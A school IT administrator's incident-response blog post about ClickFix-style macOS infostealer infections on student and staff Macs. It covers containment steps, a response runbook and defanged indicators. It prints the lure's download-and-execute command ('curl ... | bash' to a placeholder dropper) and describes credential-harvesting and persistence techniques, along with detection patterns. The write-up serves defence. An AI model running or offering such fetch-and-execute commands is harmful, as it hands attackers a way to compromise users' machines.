---
title: "The Malware You Type In Yourself"
description: "Two years of infostealers on school Macs, none of them an exploit. What ClickFix looks like up close, how the malware hid where it phoned home, what our tooling caught and missed, and the response we run now."
date: 2026-09-29
tags: ["incident-response", "macos", "infostealer", "detection", "jamf"]
---

Over the past two years I have dealt with a few too many macOS infostealer incidents across a fleet of about fifteen hundred Macs, most of them used by students. Not one of them used an exploit. There was no vulnerability, no malicious file for Gatekeeper to catch and nothing for antivirus to scan. Every single one worked the same way: the user was talked into opening Terminal and running a command.

The industry calls this ClickFix. I call it the malware you type in yourself. This is what it looked like from our side, what we got right, what we got wrong, and the response we run now.

One piece of context matters for everything that follows. Most of the student Macs involved were family-owned laptops enrolled in our device management. That is a tricky arrangement: the family owns the device, we manage it, and the line between the two decides what we are allowed to lock down. We could not remove local admin from a laptop a parent had paid for, so students had admin rights because they owned the machine, and we could not block everything we would have liked to off site. That has since changed. We have approval to move every student to an organisation-owned device and the transition is under way, which brings a long list of security benefits with it, chiefly proper control of the device whether it is at school or at home.

## What the lure looks like

The pitch changes, the mechanics do not.

A TikTok ad for a fake macOS utility, pretending to be a popular menu bar app. The download had an `.msi` extension and was, on inspection, a plain text bash script. The site told you to drag it into Terminal. No admin prompt, nothing to approve.

A sponsored Google result for a fake Apple support page about cleaning up your Mac, with a command to paste.

A "verify you are human" page with a command to paste. That one was a base64-wrapped `echo ... | base64 -d | bash`, which decodes to `curl -s https://<dropper>/script.sh | bash`. Obfuscated just enough that the person pasting it cannot read what it does.

In every case the first thing that happens is a shell piping a download straight into an interpreter. Everything after that is detail.

## Five of the incidents

### The one we found eight hours late

A Year 9 student's MacBook, a Saturday. The TikTok lure. The script ran as root (the all-powerful account on a Mac), pulled JavaScript through `osascript` (Apple's built-in script runner), installed a LaunchAgent (the Mac equivalent of a startup item, so it comes back after every login) and took its commands from DNS TXT records, the free-text notes attached to a domain name, on a domain that Jamf Threat Labs had written up a fortnight earlier as DigitStealer. Our endpoint protection alerted. Our SIEM alerted. Nobody was reading either on a Saturday afternoon, so the first human saw it at 9:30 that night.

Containment took an hour once someone was looking: suspend the identity account, block Microsoft 365 sign-in, remove the certificate profile so the device fell off 802.1X Wi-Fi. Forensics waited until Monday, when we pulled the LaunchAgent, hashed the fake installer and matched it to the published indicator. Full wipe and rebuild.

The post mortem's five whys did not land on a person. It landed on layers: no web filtering on student devices off site, no application allowlisting, unrestricted Terminal, endpoint protection in detect-only mode for this pattern, and no after-hours coverage. That list turned out to be the list. Every later incident re-derived some part of it.

### The one that ran to completion because we were only watching

A week later, a Year 7 student, the fake Apple support page. The pasted command downloaded a script, stripped the quarantine attribute (the "downloaded from the internet" flag that makes Gatekeeper ask before running something), made it executable and ran it with `sudo`, which runs it as an administrator. The script was a credential harvester in a loop: a fake "System Password:" prompt that checked each attempt against the local directory with `dscl . -authonly` and wrote the real one to a file under `/tmp` once it got it.

Our endpoint protection saw it. It was configured to Report Only for that control, so it reported, and the loop ran until it had the password. What stopped the second stage was a different control: the follow-on binary was unsigned and code signing enforcement refused to run it. The stealer payload never executed.

A reboot cleared `/tmp`, there was no persistence, and the device was clean. We reset the student's passwords across every system and briefed the parents. The configuration change from Report to Block was made that week. Report Only is a decision. We had made it without meaning to.

### The one where the data left

January, a staff member's school Mac, in personal use. A pasted `curl` command. Download, quarantine removed, executable, `sudo`, harvest, zip to `/tmp`, upload to the attacker's server. All within the same minute. The stealer then removed itself. When we got to the device there was a domain in the shell history and nothing else: no LaunchAgent, nothing in `/tmp`, no processes.

That is the AMOS pattern, Atomic macOS Stealer. It does not want to live on your machine. It wants your keychain, your browser passwords and cookies, your session tokens (the saved logins that let you skip signing in again), and your crypto wallet files, and it wants them in about twenty seconds. We treated all of it as compromised, because it was.

This was also the incident that got a formal infostealer playbook onto the agenda. The first two had been students. A staff mailbox and a staff keychain are a different conversation.

### The one that phoned Telegram for directions

April, school holidays, a Year 8 student's own MacBook, off our network the entire time. Endpoint protection fired on a dead-drop pattern (malware fetching the address of its real server from somewhere innocent-looking), then fired again twelve days later, then again the next day.

The persistence was a user LaunchAgent with a sixteen-letter gibberish label, `KeepAlive` set and no interval, so macOS restarted it roughly every ten seconds, as it is designed to do for anything marked keep-alive. That is why the alert kept recurring. The plist had been created eight days before the first alert. The payload was inline in the plist itself as base64-encoded AppleScript (base64 is a way of writing any data as plain letters and numbers, which hides it from a casual look), so there was no separate program on disk to find.

We decoded it and wrote a small Python script to undo its obfuscation, which was junk variables and strings assembled one character at a time. What came out was not the stealer. It was a beacon and a loader. It tried a primary command and control domain (the server the malware phones home to for instructions), and if that failed it read the bio of a Telegram bot to find the live address. Then it posted a campaign ID and piped whatever came back straight into `osascript`. The second stage runs in memory and never touches disk.

Because the device was off site and family-owned, we built a collection pipeline through our device management: push a forensic collector, push a profile granting it full disk access, trigger it with a policy, have it upload to a short-lived cloud storage bucket through a one-time upload link. That pipeline is now a standing runbook.

Then, on site, a surgical clean instead of a wipe, since you cannot wipe a family's laptop without consent. The order matters: disable and boot out the LaunchAgent, kill any children, delete the plist, reboot, then verify with `launchctl list` filtered for anything not Apple, a listing of the three LaunchAgents and LaunchDaemons directories, and `sfltool dumpbtm`. Twenty-four hours of monitoring with Wi-Fi on, no re-fire. Every credential on the device treated as compromised from the plist creation date, not the alert date.

### The one that hid its address on a blockchain

August, another Year 8 student, a family-owned MacBook enrolled with us. Same base64 lure, same LaunchAgent pattern, same inline AppleScript. Two differences.

First, the implant did not have a command and control domain we could block. It read its live address from a smart contract on the Polygon blockchain, by asking public blockchain gateways for the contract's contents. Anyone can read a public blockchain and nobody can take the record down, which is exactly why attackers like it. The technique is called EtherHiding. Our firewall's URL categorisation blocked three of the four RPC providers it tried as cryptocurrency. The fourth was categorised as government, so it went through, and it returned about 1.7 KB per request, which is what an address lookup looks like. The second stage host was blocked on all 24 attempts we could see. But the harvest had already run at execution time, weeks earlier.

Second, the plist dated to June. Ten weeks of dwell, the time the malware sat there running before anyone acted. And when we went back through the endpoint protection data, the device had been flagged before, at Low and Informational severity, into a smart group that no human is notified about. Four consumer anti-malware products were installed on the machine. None of them noticed.

We locked the device, revoked identity sessions rather than just blocking sign-in (blocking sign-in stops new logins, but anything already signed in stays signed in until you revoke it), suspended the account, reissued the device certificate, and told the family to save documents only and not to restore from a whole-system backup, which would bring the LaunchAgent straight back. Erased and re-enrolled.

That incident produced seven follow-up investigations. Some of what they found: our firewall's URL logs only reach back about fifty hours in term time, which is nowhere near a ten-week dwell; six of twelve public blockchain RPC providers were reachable by students because of how they were categorised; and the notification gap at low severities was fleet-wide, not one device.

## What we run now

These incidents produced one sequence. It is written down in a runbook, but the shape is simple.

1. **Triage from the process tree.** A shell piping into an interpreter is a near-certain true positive. Do not dismiss it because `bash`, `curl` and `osascript` are Apple-signed. They are. Locate the device and the person, and build the timeline in both UTC and local time, because the tooling disagrees about which to use.
2. **Contain identity before the device.** Revoke sessions, suspend the account, reset the password, wipe MFA factors, and check the account for anything the attacker left behind (mailbox rules, forwarding, OAuth grants). Then lock or retrieve the device. Then reissue the device certificate, because the certificate that gets a device onto the school Wi-Fi is worth stealing and survives a wipe.
3. **Collect before you wipe**, where the device is reachable. An MDM lock blocks collection, so sequence by who has custody.
4. **Eradicate.** Erase and re-enrol managed devices. For personally owned devices, the surgical clean above, then remove local admin on the rebuild.
5. **Keep the communications separate.** The service desk gets who and what to do, not malware detail. The student or staff member is reached through the pastoral or line management path, not straight from ICT. Leadership gets the escalation and the data breach question.
6. **Sweep the fleet** for the lure and the command and control indicators over the previous fortnight, plus the behavioural signatures below.
7. **Block at the perimeter**, including the blockchain RPC endpoints in a custom URL category for student networks.

## What I would tell someone starting this

**Detection is not notification.** We had three products detecting these. The eight-hour delay and the ten-week dwell were both cases where something noticed and nobody was told. Decide which severities reach a human, and make it a human who is rostered to look.

**Report Only is a configuration you chose.** Audit which of your controls only report. Then decide, deliberately, which of them should block.

**Category blocking is not blocking.** One miscategorised domain out of four is enough. If a class of destination should be blocked, put it in a list you own.

**Local admin is the difference between a harvest and a full compromise.** Every one of these used `sudo` or ran as root. Students do not need admin, and on a family-owned device we could not take it away. Organisation-owned devices fix that.

**Identity before device.** The device is where it happened. The identity is where it goes next.

**Log retention has to outlast dwell time.** Fifty hours of firewall logs against ten weeks of dwell means the investigation ends before it starts. Your SIEM (the central log store) is the long copy, and you should know how to query it before you need to.

**The behavioural signatures beat the family signatures.** The domains changed every time. The technique did not.

## Indicators

Defanged. The behavioural ones are the ones worth keeping.

**Behaviour**
- Any shell or `curl` output piped into an interpreter: `osascript`, `sh`, `zsh`, `python`. There is no legitimate reason for `curl | osascript`.
- A `bash` parent invoking `osascript` with a base64 argument.
- `xattr -d com.apple.quarantine` followed by `sudo` execution of the same file.
- A LaunchAgent plist over 10 KB with an inline payload, or a label matching `^com\.[a-z]{14,20}$`.
- `curl` with a faked Chrome user agent posting `txid=` and `bmodule`.

**Infrastructure**
- `goldenticketsshop[.]com` (DigitStealer, DNS TXT command and control)
- `applemacios[.]com`, `claus3doom[.]co[.]za` (AMOS payload and command and control)
- `resilientlimb[.]icu`, `0x666[.]info`, `t[.]me/ax03bot` (AMOS with Telegram dead drop)
- `gaydrdosscalefat[.]digital`, `vg5sgxv[.]lol`, Polygon contract `0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0` (AMOS with EtherHiding)
- Public Polygon JSON-RPC providers used for command and control resolution, including drpc, publicnode, tatum and tenderly endpoints

**Hashes (SHA-256)**
- `e68d80778d77fb2a2ae066b4e3b9e745ea5b687ac48c2c762f6e56687f61963a` (April LaunchAgent plist)
- `cd7adc767a25577ffca42b117eaef5ab8f4d779515780d0199d5df3c338d91b0` (April decoded AppleScript)
- `89a229f9a73cffc67089f388c6c12f3f9d80e7ae2c32745cd5212421a89c3e50` (January AMOS build)

This threat class will keep arriving, and it moves faster than signatures. What we have now that we did not have two years ago is a consistent way to meet it: a runbook, a ticket home so the follow-ups survive the incident, forensic tooling that works on and off the network, and an honest list of the gaps that let these run longer than they should have.
